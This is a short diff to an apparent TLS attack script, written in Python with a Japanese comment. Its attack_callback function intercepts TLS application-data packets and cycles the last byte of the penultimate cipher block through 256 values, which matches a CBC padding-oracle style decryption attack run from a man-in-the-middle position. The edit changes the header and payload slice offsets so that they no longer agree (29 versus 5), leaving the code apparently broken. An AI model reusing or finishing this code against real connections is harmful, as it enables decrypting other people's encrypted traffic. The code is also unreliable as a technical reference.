@@ -224,15 +224,17 @@ def attack_callback(packet):
     if tls_type == 23:
         # print(f"0x{last_byte_of_the_penultimate_block:02x}")
         if packet_count == 0:
-            previous_packet_tls_payload = bytes(pkt.getlayer('TLS'))[5:]
+            previous_packet_tls_payload = bytes(pkt.getlayer('TLS'))[29:]
             packet.accept()
             packet_count += 1
             return
         elif packet_count <= 256:
             print("packet_count", packet_count)
             last_byte_of_the_penultimate_block += 1
-            current_packet_tls_header = bytes(pkt.getlayer('TLS'))[:5]
+            current_packet_tls_header = bytes(pkt.getlayer('TLS'))[:29]
             current_packet_tls_payload = bytes(pkt.getlayer('TLS'))[5:]
+
+            print(len(bytes(pkt.getlayer('TLS')))-29)
 
             # ブロックサイズ（例: 8バイト固定）
             block_size = 8
